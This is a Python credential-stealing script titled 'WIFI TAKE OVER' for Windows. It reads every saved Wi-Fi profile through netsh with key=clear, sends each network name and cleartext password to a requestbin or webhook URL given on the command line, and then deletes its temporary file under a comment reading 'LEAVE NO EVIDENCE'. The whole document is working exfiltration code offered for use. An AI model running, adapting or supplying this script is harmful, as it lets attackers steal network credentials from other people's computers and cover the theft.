import os
import requests
import time
import argparse


def banner():
    print('''
           ___    __   __        __  
   |  | | |__  | / _` |__)  /\  |__) 
   |/\| | |    | \__> |  \ /~~\ |__) 
                          QWRrYWxp                                                 
    ''')


banner()

# --Arg to be defined--
parser = argparse.ArgumentParser(description="WIFI TAKE OVER")
parser.add_argument('-l', '-link', type=str, required=True, help='HTTP URL REQUEST (requestbin/webhook)')
args = parser.parse_args()
if "en" not in args.l:
    if "webhook" not in args.l:
        print("Use Requestbin/Webhook HTTP link")
        exit()

# ------------------------ CODE ----------------------------------
# --Search the line block, and save it for after it--
TXT2DEL = '''
Profiles on interface ??Wi-Fi:
Group policy profiles (read only)
---------------------------------
    <None>
User profiles
'''
# --URL for getting the requests ( requestbin / webhook )--
URL = args.l
# --SSID_List will append to the list after the code runs--
SSID_Append = []
Num = 0
# --Command execution for getting the SSID profiles--
Command = os.popen("netsh wlan show profiles > SSID.txt".strip())
# --Just wait for 1 second--
time.sleep(1)

with open(r"SSID.txt", "r") as ssidsplit:
    ssid = ssidsplit.readlines()
    for i in ssid:
        if "All User Profile" in i:
            NewSSID = i.split("All User Profile")[1]
            USERS = NewSSID.strip().split(":")[1]
            SSID_Append.append(USERS.strip())
        else:
            continue
print(f"Total {(len(SSID_Append))} WIFI PASSWORDS.")
# ------------------------ EXECUTE (COMBINE IT ALL ) -------------------------

# --For each WIFI creds--
for Each in SSID_Append:
    # -- If length of SSID list is > 0, RUN it--
    if len(SSID_Append) > 0:
        try:
            KEY = os.popen(f'netsh wlan show profile name="{Each}" key=clear').read()
            r = requests.get(URL, params="format=json", data=f"Password of {Each}: " + KEY)
            # --Check for status code when sent the request over--
            if r.status_code == 200:
                Num += 1
                print(f"Credentials {Num} are sent, please wait...")
                time.sleep(2)
            else:
                print("Something went wrong!\ntry again please.....")
                exit()

        except Exception as e:
            print(e)

# --LEAVE NO EVIDENCE/DELETE FILES--
os.remove("SSID.txt")
print(f"Process finished.\nPlease Check {URL}")
